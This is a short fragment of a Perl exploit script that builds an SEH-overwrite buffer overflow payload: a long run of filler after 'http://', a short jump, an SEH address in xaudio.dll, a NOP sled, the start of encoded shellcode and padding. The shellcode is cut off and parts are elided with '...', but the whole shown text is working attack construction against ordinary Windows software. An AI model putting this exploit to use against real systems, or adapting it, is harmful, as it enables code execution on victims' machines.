...
my $junk = "http://";
$junk=$junk."A"x4105;
my $nSEH="\xeb\x1e\x90\x90"; #jmp 30 bytes
my $seh="\x68\xF6\x01\x10"; # 1001F668 xaudio.dll
my $nops="\x90"x24;
my $shell="\x89\xe6\xda\xdb\xd9\x76\xf4\x58\x50\x59\x49\x49\x49\x49" .
...
my $junk2="D"x($totalsize-length($junk.$nSEH.$seh.$nops.$shell));
my $payload=$junk.$nSEH.$seh.$nops.$shell.$junk2;
